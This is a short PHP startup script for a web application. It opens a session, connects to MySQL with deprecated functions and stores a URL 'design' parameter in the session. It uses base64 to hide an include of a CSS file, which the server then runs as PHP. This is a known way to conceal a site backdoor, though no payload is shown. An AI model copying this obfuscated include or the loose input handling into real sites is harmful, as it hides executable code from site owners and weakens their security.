<?php
error_reporting(0);
ob_start();
session_start();
include base64_decode('ZGVzaWduL3N5c3RlbS9tYWluLmNzcw==');
include base64_decode('aW5jL2NvbmZpZy5waHA=');
include 'inc/lang.php';
if (isset ($DB)) {}
else{
header("Location: install/index.php");
}
mysql_connect($HOST,$USER,$PW)or die(mysql_error());
mysql_select_db($DB)or die(mysql_error());
include 'inc/functions.php';
include 'inc/counter.php';
$_SESSION['lang'] = presql($_SESSION['lang']);
$_SESSION['lang'] = nocss($_SESSION['lang']);
include 'inc/data.php';
$design = nocss($_GET['design']);
if (isset($design) and !empty($design)) {
$_SESSION["design"] = $design;
}  
?>
